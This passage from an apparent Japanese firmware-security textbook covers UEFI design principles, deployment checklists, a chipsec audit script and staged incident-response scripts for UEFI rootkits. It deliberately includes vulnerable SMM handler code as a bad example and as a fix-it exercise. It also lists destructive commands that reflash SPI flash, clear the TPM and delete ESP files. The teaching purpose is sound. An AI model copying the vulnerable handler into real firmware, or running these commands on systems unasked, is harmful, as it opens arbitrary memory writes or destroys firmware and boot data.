    C --> C2[Remote Attestation]
    C --> C3[chipsec 定期スキャン]
    C --> C4[ログ監視]

    D --> D1[インシデント対応計画]
    D --> D2[パッチ管理プロセス]
    D --> D3[バックアップ/復旧]
```



---

## セキュリティ設計原則の体系化

### 原則 1: 最小特権の原則 (Principle of Least Privilege)

**定義**: すべてのコンポーネントは必要最小限の権限のみで動作すべき

**適用例**:
```c
// 悪い例: すべてのメモリアクセスを許可
EFI_STATUS SmiHandler(VOID *Buffer) {
  CopyMem(AnyAddress, Buffer, AnySize);  // 危険！
}

// 良い例: ホワイトリストで制限
EFI_STATUS SecureSmiHandler(VOID *Buffer, UINTN Size) {
  if (!IsAddressInAllowedRange(Buffer)) {
    return EFI_SECURITY_VIOLATION;
  }
  if (!SmmIsBufferOutsideSmram(Buffer, Size)) {
    return EFI_SECURITY_VIOLATION;
  }
  // ...
}
```

### 原則 2: 信頼できる基盤 (Root of Trust)

**定義**: ハードウェアベースの変更不可能な信頼の起点を確立する

**実装**:
- **Intel**: Boot Guard ACM（CPU ROM に焼き込み）
- **AMD**: PSP Bootloader（PSP ROM に焼き込み）
- **ARM**: TrustZone Secure Boot

### 原則 3: 失敗時の安全性 (Fail-Safe Defaults)

**定義**: エラー時はより安全な状態に遷移する

```c
// Boot Guard の例
if (!VerifyIbbSignature()) {
  if (BootGuardProfile == VERIFIED_BOOT) {
    ShutdownSystem();  // 検証失敗時は起動を停止
  } else {
    ExtendPcr(FAILURE_MEASUREMENT);  // 記録して続行
  }
}
```

### 原則 4: 多層防御 (Defense in Depth)

**定義**: 単一の防御メカニズムに依存せず、複数の独立した防御層を設ける

| レイヤー | メカニズム | 迂回された場合の次の防御 |
|---------|----------|----------------------|
| **HW** | Boot Guard | SMM 保護 |
| **FW** | Secure Boot | TPM Measured Boot |
| **OS** | UEFI Runtime Protection | EDR/AV |
| **Network** | TLS | IDS/IPS |

### 原則 5: 最小限の共通メカニズム (Least Common Mechanism)

**定義**: 異なるセキュリティドメイン間でのリソース共有を最小化する

```c
// 悪い例: SMM と OS が同じバッファを共有
VOID *SharedBuffer = AllocatePool(SIZE);

// 良い例: SMM 内部でコピーを作成
VOID *SmmLocalBuffer = AllocatePool(SIZE);
CopyMem(SmmLocalBuffer, OsBuffer, SIZE);  // TOCTOU 対策
```

### 原則 6: 心理的受容性 (Psychological Acceptability)

**定義**: セキュリティメカニズムは使いやすくなければ回避される

**失敗例**: BootHole の dbx 更新が古いシステムを起動不能にし、多くのユーザーが Secure Boot を無効化

**改善策**: 段階的な移行期間、明確な通知、回復手順の提供

---

## 実践的チェックリスト

### 開発段階でのチェック

- [ ] すべての外部入力に対して境界値チェックを実施
- [ ] SMM ハンドラで SmmIsBufferOutsideSmram() を使用
- [ ] TOCTOU 攻撃を防ぐためローカルコピーを使用
- [ ] 固定サイズバッファの代わりに動的メモリ確保
- [ ] すべてのポインタを信頼しない（NULL チェック + 範囲チェック）
- [ ] 暗号化鍵をハードコードしない
- [ ] デバッグコードを本番ビルドから除外

### デプロイ段階でのチェック

- [ ] Boot Guard/PSP をプロビジョニング
- [ ] Secure Boot を有効化
- [ ] TPM を有効化し、PCR 測定を実施
- [ ] SPI Flash 書き込み保護（WP# ピン）を設定
- [ ] IOMMU を有効化
- [ ] Thunderbolt Security Level を "User Authorization" 以上に設定
- [ ] BIOS 更新プロセスを確立

### 運用段階でのチェック

```bash
#!/bin/bash
# security_audit.sh - 定期的なセキュリティチェック

# 1. Secure Boot 状態
mokutil --sb-state

# 2. TPM PCR 値のベースライン比較
tpm2_pcrread -o current_pcrs.bin
diff baseline_pcrs.bin current_pcrs.bin

# 3. SPI Flash 保護状態
sudo chipsec_main -m common.bios_wp

# 4. UEFI 変数の改竄チェック
sudo chipsec_main -m common.uefi.auth

# 5. SMM 保護状態
sudo chipsec_main -m common.smm

# 6. IOMMU 状態
dmesg | grep -i "DMAR:\|IOMMU"
```

---

## インシデントレスポンス手順

### Phase 1: 検出・トリアージ

```python
# incident_triage.py
import subprocess
import json

def triage_uefi_infection():
    """UEFI 感染の兆候を確認"""
    indicators = {}

    # 1. PCR 値の異常
    pcr_values = subprocess.check_output(['tpm2_pcrread', '-o', '/dev/stdout'])
    indicators['pcr_anomaly'] = check_pcr_against_baseline(pcr_values)

    # 2. ESP の不審なファイル
    indicators['esp_malware'] = scan_esp_partition()

    # 3. SPI Flash の整合性
    result = subprocess.run(['sudo', 'chipsec_main', '-m', 'tools.uefi.whitelist'],
                          capture_output=True, text=True)
    indicators['unknown_modules'] = 'FAILED' in result.stdout

    # 4. ブートログの異常
    indicators['boot_anomaly'] = check_boot_logs()

    # トリアージ結果
    severity = calculate_severity(indicators)

    return {
        'severity': severity,
        'indicators': indicators,
        'recommendation': get_recommendation(severity)
    }

# 実行
result = triage_uefi_infection()
print(json.dumps(result, indent=2))
```

### Phase 2: 封じ込め

```bash
# containment.sh - 感染拡大防止

# 1. ネットワークから隔離
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP
sudo iptables -P FORWARD DROP

# 2. Thunderbolt ポートを無効化
echo 0 | sudo tee /sys/bus/thunderbolt/devices/*/authorized

# 3. SMM からの書き込みを防止（可能な場合）
sudo setpci -s 00:1f.0 0xDC.B=0x0A  # BIOS Control Register

# 4. システムをシャットダウン（オフライン解析用）
sudo shutdown -h now
```

### Phase 3: 根絶

```bash
# eradication.sh - マルウェア除去

# 1. SPI Flash を既知の良好なイメージで上書き
sudo flashrom -p internal -w known_good_bios.bin

# 2. ESP をクリーンアップ
sudo mount /boot/efi
sudo find /boot/efi -type f -name "*.exe" -delete
sudo find /boot/efi -type f -name "*.dll" -delete

# 3. UEFI 変数をリセット
sudo efibootmgr --delete-bootnum -b 0000  # 不審なブートエントリを削除

# 4. TPM をクリア
sudo tpm2_clear -c p  # Platform Hierarchy をクリア
```

### Phase 4: 復旧

1. **クリーンインストール**: OS を再インストール
2. **設定の強化**: Secure Boot, Boot Guard, IOMMU を有効化
3. **監視の強化**: TPM Remote Attestation を設定
4. **証拠保全**: フォレンジックイメージを保存

---

## 💻 演習

### 演習 1: 脆弱な SMM ハンドラの修正

以下のコードの脆弱性を特定し、修正してください。

```c
EFI_STATUS VulnerableSmiHandler(VOID *Buffer, UINTN Size) {
  UINT64 *Address = (UINT64 *)Buffer;
  UINT64 Value = *(Address + 1);

  *(UINT64 *)(UINTN)(*Address) = Value;
  return EFI_SUCCESS;
}
```

**ヒント**: ThinkPwn の攻撃パターンを参考にしてください。

### 演習 2: UEFI モジュールのフォレンジック

1. `/boot/efi` 配下のすべての `.efi` ファイルをリストアップ
2. 各ファイルの SHA-256 ハッシュを計算
3. ベンダー公式のハッシュと比較
4. 不一致があれば詳細を調査

```bash
# スクリプトを作成してください
```

### 演習 3: インシデント対応計画の作成

あなたの組織で LoJax 類似のマルウェアが発見されたと仮定し、以下を含むインシデント対応計画を作成してください：

1. 検出から24時間以内のアクションプラン
2. ステークホルダーへの通知プロセス
3. 証拠保全手順
4. 根絶・復旧手順
5. 再発防止策

---

## まとめ

本章では5つの重要なファームウェア攻撃事例を分析し、以下の普遍的な教訓を導き出しました。

### 攻撃事例から学んだ重要な教訓

| 事例 | 主な教訓 | 技術的対策 |
|------|---------|----------|
| **ThinkPwn** | SMM ハンドラの入力検証は絶対に必要 | SmmIsBufferOutsideSmram() |
| **LoJax** | ソフトウェアだけの保護は不十分 | Boot Guard + WP# ピン |
| **BootHole** | 信頼チェーンは最も弱い部分で破綻 | dbx 更新 + エコシステム連携 |
| **MosaicRegressor** | ESP も攻撃対象として監視が必要 | ホワイトリスト + 継続監視 |
| **Thunderspy** | 物理アクセスの脅威を過小評価しない | IOMMU + DMA Protection |

### セキュリティ設計の6原則

1. **最小特権の原則**: 必要最小限の権限のみ付与
2. **信頼できる基盤**: ハードウェアベースの Root of Trust
3. **失敗時の安全性**: エラー時はより安全な状態へ
4. **多層防御**: 複数の独立した防御層
5. **最小限の共通メカニズム**: セキュリティドメイン間の共有を最小化
6. **心理的受容性**: 使いやすいセキュリティ

### 実装チェックリスト

**開発時**:
- ✅ すべての外部入力を検証
- ✅ TOCTOU 対策としてローカルコピー使用
- ✅ 固定サイズバッファを避ける
- ✅ デバッグコードを本番から除外

**デプロイ時**:
- ✅ Boot Guard/PSP プロビジョニング
- ✅ Secure Boot + TPM 有効化
- ✅ SPI Flash 物理保護
- ✅ IOMMU 有効化

**運用時**:
- ✅ TPM PCR 値の定期チェック
- ✅ chipsec による自動スキャン
- ✅ ESP の定期的な検査
- ✅ インシデント対応計画の準備

---

次章では、Part IV 全体のまとめとして、セキュリティ機能の統合的な設計方法と、今後の展望について解説します。

📚 **参考資料**
- [ThinkPwn Whitepaper](https://github.com/Cr4sh/ThinkPwn)
- [ESET LoJax Analysis](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild/)
- [Eclypsium BootHole Report](https://eclypsium.com/2020/07/29/theres-a-hole-in-the-boot/)
- [Kaspersky MosaicRegressor](https://securelist.com/mosaicregressor/98849/)
- [Thunderspy](https://thunderspy.io/)
- [NIST SP 800-147: BIOS Protection Guidelines](https://csrc.nist.gov/publications/detail/sp/800-147/final)
- [NIST SP 800-193: Platform Firmware Resiliency Guidelines](https://csrc.nist.gov/publications/detail/sp/800-193/final)
